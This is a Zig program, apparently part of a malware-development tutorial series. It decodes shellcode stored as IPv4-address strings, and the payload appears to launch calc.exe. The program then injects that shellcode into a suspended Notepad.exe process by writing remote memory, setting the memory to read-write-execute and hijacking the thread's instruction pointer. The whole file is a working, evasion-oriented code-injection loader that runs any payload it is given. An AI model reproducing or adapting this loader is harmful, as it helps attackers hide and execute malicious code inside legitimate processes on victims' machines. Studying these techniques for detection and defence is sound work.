const std = @import("std");
const ipv4Deobfuscation = @import("9.payload-obfuscation-ipv4fuscation.zig").ipv4Deobfuscation;
const win = @import("zigwin32").everything;

const assert = std.debug.assert;

// x86
// const CONTEXT_CONTROL = 0x00010001;

// x64
const CONTEXT_CONTROL = 0x00100001;

const STARTUPINFOA = win.STARTUPINFOA;
const PROCESS_INFORMATION = win.PROCESS_INFORMATION;
const HANDLE = win.HANDLE;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const CONTEXT = win.CONTEXT;
const INFINITE = win.INFINITE;

const GetEnvironmentVariableA = win.GetEnvironmentVariableA;
const CreateProcessA = win.CreateProcessA;
const GetLastError = win.GetLastError;
const VirtualAllocEx = win.VirtualAllocEx;
const WriteProcessMemory = win.WriteProcessMemory;
const VirtualProtectEx = win.VirtualProtectEx;
const GetThreadContext = win.GetThreadContext;
const SetThreadContext = win.SetThreadContext;
const ResumeThread = win.ResumeThread;
const WaitForSingleObject = win.WaitForSingleObject;

const ProcessInformation = struct {
    h_process: HANDLE,
    h_thread: HANDLE,
};

const ipv4_array = [_][:0]const u8{ "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0" };

fn createSuspendedProcess(allocator: std.mem.Allocator, process_name: []const u8) !ProcessInformation {
    var buf: [1024:0]u8 = undefined;
    buf[1023] = 0;
    const win_dir_len = GetEnvironmentVariableA("WINDIR", &buf, buf.len);

    assert(win_dir_len <= buf.len);
    if (win_dir_len == 0) {
        std.debug.print("[!] GetEnvironmentVariableA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetEnvironmentVariableAFailed;
    }

    const win_dir = buf[0..win_dir_len];

    const path = try std.fmt.allocPrintZ(allocator, "{s}\\System32\\{s}", .{ win_dir, process_name });
    defer allocator.free(path);

    var startup_info = std.mem.zeroes(STARTUPINFOA);
    var process_info: PROCESS_INFORMATION = undefined;

    if (CreateProcessA(
        null,
        path,
        null,
        null,
        0,
        .{ .CREATE_SUSPENDED = 1 },
        null,
        null,
        &startup_info,
        &process_info,
    ) == 0) {
        std.debug.print("[!] CreateProcessA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateProcessAFailed;
    }

    if (process_info.hProcess == null or process_info.hThread == null or process_info.dwProcessId == 0 or process_info.dwThreadId == 0) {
        std.debug.print("[!] CreateProcessA Succeeded But Returned Invalid Process Info\n", .{});
        return error.InvalidProcessInfo;
    }

    return .{
        .h_process = process_info.hProcess.?,
        .h_thread = process_info.hThread.?,
    };
}

fn injectShellcodeToRemoteProcess(h_process: HANDLE, shellcode: []const u8) !*anyopaque {
    const address = VirtualAllocEx(
        h_process,
        null,
        shellcode.len,
        .{ .COMMIT = 1, .RESERVE = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAllocEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocExFailed;
    };

    var num_of_bytes_written: usize = 0;
    if (WriteProcessMemory(
        h_process,
        address,
        shellcode.ptr,
        shellcode.len,
        &num_of_bytes_written,
    ) == 0 or num_of_bytes_written != shellcode.len) {
        std.debug.print("[!] WriteProcessMemory Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.WriteProcessMemoryFailed;
    }

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtectEx(
        h_process,
        address,
        shellcode.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectExFailed;
    }

    return address;
}

fn hijackThread(h_thread: HANDLE, shellcode_address: *anyopaque) !void {
    var thread_context: CONTEXT = undefined;
    thread_context.ContextFlags = CONTEXT_CONTROL;
    if (GetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] GetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetThreadContextFailed;
    }

    // X86
    // thread_context.Eip = @intFromPtr(address);

    // X64
    thread_context.Rip = @intFromPtr(shellcode_address);

    if (SetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] SetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.SetThreadContextFailed;
    }

    _ = ResumeThread(h_thread);
    _ = WaitForSingleObject(h_thread, INFINITE);
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shellcode = try ipv4Deobfuscation(allocator, &ipv4_array);
    defer allocator.free(shellcode);

    const process_info = try createSuspendedProcess(allocator, "Notepad.exe");
    const shellcode_address = try injectShellcodeToRemoteProcess(process_info.h_process, shellcode);
    try hijackThread(process_info.h_thread, shellcode_address);
}
